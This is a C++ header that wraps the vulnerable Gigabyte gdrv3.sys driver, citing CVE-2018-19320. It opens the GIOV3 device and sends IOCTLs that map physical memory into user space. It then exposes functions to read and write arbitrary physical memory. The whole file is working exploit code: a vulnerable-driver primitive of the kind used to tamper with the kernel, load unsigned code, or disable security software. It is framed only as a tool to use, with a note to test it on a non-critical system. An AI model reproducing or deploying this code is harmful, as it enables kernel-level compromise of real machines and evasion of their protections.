#pragma once
#include <Windows.h>
#include <string>
#include <iostream>
#include "nt.hpp"

/*
 * gdrv3.sys (Gigabyte) Driver Wrapper
 * Based on CVE-2018-19320 patterns
 * 
 * Device: \\.\GIOV3
 * Uses MmMapIoSpace for physical memory access
 * 
 * WARNING: Structure may vary between driver versions.
 * Test carefully on non-critical system first.
 */

namespace gdrv_driver
{
    // Known IOCTLs for GIO driver family
    constexpr DWORD IOCTL_MAP_PHYS_ADDR   = 0xC3502004;
    constexpr DWORD IOCTL_UNMAP_PHYS_ADDR = 0xC3502008;

    // Map physical memory request structure
    // This is the most common layout for gdrv family
#pragma pack(push, 1)
    struct MAP_PHYS_REQUEST {
        LARGE_INTEGER PhysicalAddress;  // 8 bytes - physical address to map
        ULONG         Size;             // 4 bytes - size to map
        ULONG         Padding;          // 4 bytes - alignment padding
        PVOID         MappedAddress;    // 8 bytes - output: virtual address
    }; // 24 bytes total

    struct UNMAP_PHYS_REQUEST {
        PVOID         VirtualAddress;   // 8 bytes - address to unmap
        ULONG         Size;             // 4 bytes - size to unmap
        ULONG         Padding;          // 4 bytes - alignment
    }; // 16 bytes total
#pragma pack(pop)

    extern HANDLE hDevice;

    inline bool IsRunning() {
        HANDLE h = CreateFileW(L"\\\\.\\GIOV3", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            return true;
        }
        return false;
    }

    inline NTSTATUS Load() {
        // gdrv3 should already be loaded by RGB Fusion
        // Just open the device
        hDevice = CreateFileW(L"\\\\.\\GIOV3", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cout << "[-] Failed to open GIOV3 device. Error: " << GetLastError() << std::endl;
            return STATUS_UNSUCCESSFUL;
        }
        
        std::cout << "[+] Opened GIOV3 device successfully" << std::endl;
        return STATUS_SUCCESS;
    }

    inline NTSTATUS Unload() {
        if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            hDevice = nullptr;
        }
        return STATUS_SUCCESS;
    }

    // Map physical memory to virtual address space
    inline uint64_t MapIoSpace(uint64_t physical_address, uint32_t size) {
        if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
            return 0;

        MAP_PHYS_REQUEST req = {};
        req.PhysicalAddress.QuadPart = physical_address;
        req.Size = size;
        req.Padding = 0;
        req.MappedAddress = nullptr;

        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(
            hDevice,
            IOCTL_MAP_PHYS_ADDR,
            &req,
            sizeof(req),
            &req,
            sizeof(req),
            &bytesReturned,
            nullptr
        );

        if (!result) {
            std::cout << "[-] MapIoSpace failed. Error: " << GetLastError() << std::endl;
            return 0;
        }

        return reinterpret_cast<uint64_t>(req.MappedAddress);
    }

    // Unmap previously mapped physical memory
    inline bool UnmapIoSpace(uint64_t virtual_address, uint32_t size) {
        if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
            return false;

        UNMAP_PHYS_REQUEST req = {};
        req.VirtualAddress = reinterpret_cast<PVOID>(virtual_address);
        req.Size = size;
        req.Padding = 0;

        DWORD bytesReturned = 0;
        return DeviceIoControl(
            hDevice,
            IOCTL_UNMAP_PHYS_ADDR,
            &req,
            sizeof(req),
            nullptr,
            0,
            &bytesReturned,
            nullptr
        ) != FALSE;
    }

    // Read from physical memory
    inline bool ReadPhysicalMemory(uint64_t physical_address, void* buffer, size_t size) {
        uint64_t mapped = MapIoSpace(physical_address, static_cast<uint32_t>(size));
        if (!mapped)
            return false;

        memcpy(buffer, reinterpret_cast<void*>(mapped), size);
        UnmapIoSpace(mapped, static_cast<uint32_t>(size));
        return true;
    }

    // Write to physical memory
    inline bool WritePhysicalMemory(uint64_t physical_address, void* buffer, size_t size) {
        uint64_t mapped = MapIoSpace(physical_address, static_cast<uint32_t>(size));
        if (!mapped)
            return false;

        memcpy(reinterpret_cast<void*>(mapped), buffer, size);
        UnmapIoSpace(mapped, static_cast<uint32_t>(size));
        return true;
    }
}
